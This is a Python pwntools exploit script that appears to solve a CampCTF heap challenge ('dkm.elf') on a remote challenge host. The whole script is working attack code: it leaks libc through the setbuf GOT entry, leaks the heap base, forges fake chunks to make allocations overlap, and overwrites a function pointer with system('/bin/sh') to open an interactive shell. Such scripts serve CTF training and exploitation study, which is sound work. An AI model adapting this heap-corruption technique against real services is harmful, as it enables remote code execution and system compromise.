#!/usr/bin/python

from pwn import *
from pwnlib.log import *


elf = ELF("dkm.elf")
libc = ELF("libc.so.6")

def list_dk():
	global r
	r.recvuntil("> ")
	r.sendline("1") 

def add_dk(with_wifi, lg, la, comment, ssid_num = None, ssid = None):
	global r
	r.recvuntil("> ")
	r.sendline("2") 
	r.recvuntil("> ")
	r.sendline(str(with_wifi))
	r.recvuntil("> ")
	r.sendline(str(lg))
	r.recvuntil("> ")
	r.sendline(str(la))
	buf = r.recvuntil("> ")
	if "ssid" in buf:
		r.sendline(str(ssid_num))
		r.recvuntil("> ")
		r.sendline(ssid)
		r.recvuntil("> ")
	r.sendline(comment)
	r.recvuntil("added.\n")

def rm_dk(index):
	global r
	r.recvuntil("> ")
	r.sendline("3") 
	r.recvuntil("> ")
	r.sendline(str(index))
	r.recvuntil("deleted.\n")

def edit_dk(index, with_wifi, lg, la, comment, ssid_num = None, ssid = None):
	global r
	r.recvuntil("> ")
	r.sendline("4") 
	r.recvuntil("> ")
	r.sendline(str(index))
	r.recvuntil("> ")
	r.sendline(str(with_wifi))
	r.recvuntil("> ")
	r.sendline(str(lg))
	r.recvuntil("> ")
	r.sendline(str(la))
	buf = r.recvuntil("> ")
	if "ssid" in buf:
		r.sendline(str(ssid_num))
		r.recvuntil("> ")
		if ssid_num > 0:
			r.sendline(ssid)
			r.recvuntil("> ")
	r.sendline(comment)
	r.recvuntil("saved.\n")

def padding(s, n):
	while len(s) < n:
		s += "0"
	return s

# trigger vuln
#r = remote("localhost", 5566)
r = remote("challs.campctf.ccc.ac", 10102)

# leak libc
add_dk(1, 1, 1, "comment", 1, "ssid")
edit_dk(0, 2, 1, 1, p64(elf.got["setbuf"]))
list_dk()
r.recvuntil("SSID: ")
libc.address +=  u64(r.recv(6)+"\x00\x00") - libc.symbols["setbuf"]
info("system: 0x%x" % libc.symbols["system"])

# leak heap
rm_dk(0)
add_dk(2, 1, 1, "comment")
edit_dk(0, 1, 1, 1, "comment", 1, "ssid")
list_dk()
r.recvuntil("Comment: ")
heap_base = u32(r.recv(4).replace("\x0a", "\x00"))
heap_base -= 0x5e0
rm_dk(0)
info("heap: 0x%x" % heap_base)

# fake_chunk = 0x1d0, 0xf90
# 0x1d0 = malloc(0x520) = dk#2
fc1 = p64(0) + p64(0x531) + p64(0) + p64(heap_base + 0xf90)
fc1 = padding(fc1, 1023)
fc2 = p64(0) + p64(0x531) + p64(0) + p64(heap_base + 0x1d0)
fc2 = padding(fc2, 1023)
add_dk(1, 1, 1, fc1, 1, "ssid")
add_dk(1, 1, 1, fc2, 1, "ssid")
edit_dk(1, 2, 1, 1, "gg")
edit_dk(1, 3, 1, 1, "a"*(1023-0x100+1) + "\x00"*8 + p64(0x81) + "a"*8 + p64(heap_base + 0x1d0), 1, "ssid")
add_dk(1, 1, 1, "comment", 1, "ssid")
info("get victim chunk")

# dk#2 overlap with dk#0, edit dk#0's comment can overwrite func ptr
# system("/bin/sh")
edit_dk(0, 3, 1, 1, padding("a"*16+"/bin/sh;",40) + p64(libc.symbols["system"]), 0)
r.recvuntil("> ")
r.sendline("4") 
r.recvuntil("> ")
r.sendline("2")
r.recvuntil("> ")
r.sendline("3")


r.interactive()
